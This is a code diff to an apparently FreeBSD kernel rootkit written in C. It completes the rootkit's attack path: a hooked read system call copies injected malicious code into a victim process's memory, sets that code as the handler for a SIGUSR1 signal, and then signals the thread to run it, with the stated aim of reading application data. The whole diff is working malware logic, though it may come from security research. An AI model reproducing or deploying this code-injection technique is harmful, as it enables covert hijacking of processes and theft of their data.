@@ -37,6 +37,9 @@
 //  4) Attempt to directly read application data
 //
 
+// Signal to use for the attack
+static const int attackSig = SIGUSR1;
+
 // Target process to attack
 struct proc * victimProc = 0;
 
@@ -87,8 +90,12 @@ insertMaliciousCode (struct thread * td) {
   printf ("Rootkit: error = %d: memory at %lx\n", error, td->td_retval[0]);
 
   //
-  // TODO: Install malicious code into the allocated memory.
+  // Install malicious code into the allocated memory.
   //
+  extern void * badcode;
+  extern void * endcode;
+  printf ("Rootkit: bcopy: %p %p %lx\n", badcode, td->td_retval[0], endcode - badcode);
+  bcopy (badcode, td->td_retval[0], endcode - badcode); 
 
   //
   // Mark that we've inserted the malicious code.
@@ -117,7 +124,22 @@ setMaliciousHandler (struct thread * td, void * handler) {
   //
   // Install the signal handler for the victim thread.
   //
-  kern_sigaction (td, SIGSEGV, &action, NULL, 0);
+  kern_sigaction (td, attackSig, &action, NULL, 0);
+}
+
+//
+// Function: attackThread ()
+//
+// Description:
+//  Perform the actual attack on the specified thread.
+//
+static void
+attackThread (struct thread * td) {
+  //
+  // Send a signal to the process to trigger the exploit code.
+  //
+  tdsignal (td, attackSig);
+  return;
 }
 
 //
@@ -172,6 +194,7 @@ read_hook (struct thread * td, void * syscall_args) {
   if (isVictimThread (td)) {
     void * handler = insertMaliciousCode (td);
     setMaliciousHandler (td, handler);
+    attackThread (td);
   }
 
   //
